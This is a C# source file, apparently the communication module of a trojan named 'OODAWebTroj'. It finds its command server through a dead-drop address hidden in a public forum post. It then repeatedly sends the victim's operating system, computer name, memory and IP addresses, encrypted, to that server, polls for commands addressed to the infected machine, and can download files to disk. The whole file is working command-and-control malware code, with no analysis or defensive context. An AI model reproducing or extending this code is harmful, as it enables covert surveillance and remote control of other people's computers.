using System;
using System.Diagnostics.CodeAnalysis;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace OODAWebTroj
{
    [SuppressMessage("ReSharper", "FunctionNeverReturns")]
    internal class Comm
    {
        internal enum CommType
        {
            Http = 1,
            Dns = 2,
            Icmp=3
        };
        public static void Start(Observer.SystemInfo sysinfo, CommType commType )
        {
            S = sysinfo;
            switch (commType)
            {
                case CommType.Http:
                    Http.Start();
                    break;
                case CommType.Dns:
                    //todo: DNS Protocol
                    break;
                case CommType.Icmp:
                    //todo: ICMP Protocol
                    break;
                default:
                    //todo:????
                    Application.Exit();
                    break;
            }
        }

        public static Observer.SystemInfo S;
        public static string LastCmd = "", ThisCmd = "";
        private static string _ip = "";
        private static readonly string Guid = S.Guid;
        internal class Http
        {
            public static bool Start()
            {
                GetIpAddr();
                try
                {
                    var reportThread = new Thread(Report);
                    reportThread.Start();
                    var fetchThread = new Thread(Fetchcmd);
                    fetchThread.Start();
                    return true;
                }
                catch
                {
                    return false;
                }
            }

            public static bool DownloadFile(string url, string path)
            {
                try
                {
                    // 设置参数
                    var request = WebRequest.Create(url) as HttpWebRequest;
                    //发送请求并获取相应回应数据
                    var response = request?.GetResponse() as HttpWebResponse;
                    //直到request.GetResponse()程序才开始向目标网页发送Post请求
                    if (response == null) return true;
                    var responseStream = response.GetResponseStream();
                    //创建本地文件写入流
                    Stream stream = new FileStream(path, FileMode.Create);
                    var bArr = new byte[1024];
                    if (responseStream != null)
                    {
                        var size = responseStream.Read(bArr, 0, bArr.Length);
                        while (size > 0)
                        {
                            stream.Write(bArr, 0, size);
                            size = responseStream.Read(bArr, 0, bArr.Length);
                        }
                    }
                    stream.Close();
                    responseStream?.Close();
                    return true;
                }
                catch (Exception)
                {
                    //MessageBox.Show(ex.ToString());

                    return false;
                }
            }

            public static string PostReq(string url, string postDataStr)
            {
                postDataStr = postDataStr.Replace("+", "%2B");
                try
                {
                    var request = (HttpWebRequest)WebRequest.Create(url);
                    request.Method = "POST";
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.ContentLength = Encoding.UTF8.GetByteCount(postDataStr);
                    var myRequestStream = request.GetRequestStream();
                    var myStreamWriter = new StreamWriter(myRequestStream, Encoding.GetEncoding("gb2312"));
                    myStreamWriter.Write(postDataStr);
                    myStreamWriter.Close();

                    var response = (HttpWebResponse)request.GetResponse();

                    var myResponseStream = response.GetResponseStream();
                    if (myResponseStream != null)
                    {
                        var myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                        var retString = myStreamReader.ReadToEnd();
                        myStreamReader.Close();
                        myResponseStream.Close();

                        return retString;
                    }
                    return null;
                }
                catch (Exception)
                {
                    //MessageBox.Show(ex.ToString());
                    return null;
                }
            }

            public static string GetReq(string link, string datastr)
            {
                var retString="";
                while (true)
                {
                    try
                    {
                        var request = (HttpWebRequest)WebRequest.Create(link + (datastr == "" ? "" : "?") + datastr);
                        request.Method = "GET";
                        request.ContentType = "text/html;charset=UTF-8";

                        var response = (HttpWebResponse)request.GetResponse();
                        var myResponseStream = response.GetResponseStream();
                        if (myResponseStream != null)
                        {
                            var myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                            retString = myStreamReader.ReadToEnd();
                            myStreamReader.Close();
                        }
                        myResponseStream?.Close();
                        break;
                    }
                    catch
                    {
                        // ignored
                    }
                }
                return retString;
            }


            public static bool SendInfo()
            {
                var nowDate = DateTime.Now;
                var datetime = nowDate.ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss");

                var datastr = "('" + S.OSname + "','" + S.ComputerName + "','" + S.PhysicalMemory + "','"
                    + S.InnerIpAddr + "','" + S.OutterIpAddr + "','" + Guid + "','" + datetime + "')";

                var message = Guid + "info" + Crypt.CgZipUtil.GZipCompressString(Crypt.Encrypt(datastr));
                var cryptedata = "datastr=" + Crypt.WeakEnc(message);
                PostReq("http://" + _ip + "/front.php", cryptedata);

                return true;
            }

            public static string GetCmd()
            {
                string raw;
                do { raw = PostReq("http://" + _ip + "/front.php", "datastr=GET"); }
                while (string.IsNullOrEmpty(raw));

                var msg = Crypt.WeakDec(raw.Substring(6)).Split('\n');

                foreach (var line in msg)
                {
                    if (line == "") continue;
                    if (line.Substring(0, 14) != Guid + "comd")
                        continue;
                    ThisCmd = Crypt.Decrypt(line.Substring(14));
                    return ThisCmd;
                }

                return null;
            }
        }
        public static void GetIpAddr()
        {
            const string addr = "https://h.nimingban.com/t/9828253";
            var pageret = Http.GetReq(addr, "");
            var sub = pageret.Substring(pageret.LastIndexOf("ipstart", StringComparison.Ordinal) + 7);
            _ip = sub.Substring(0, sub.IndexOf("ipend", StringComparison.Ordinal));
        }
        public static void Report()
        {
            while (true)
            {
                var ran = new Random();
                var randKey = ran.Next(100, 999);
                Thread.Sleep(6000 + randKey);
                Http.SendInfo();
            }
        }
        public static void Fetchcmd()
        {
            Thread.Sleep(500);
            while (true)
            {
                var ran = new Random();
                var randKey = ran.Next(100, 999);
                Thread.Sleep(6000 + randKey);

                var ret = Http.GetCmd();
            }
        }

    }
}
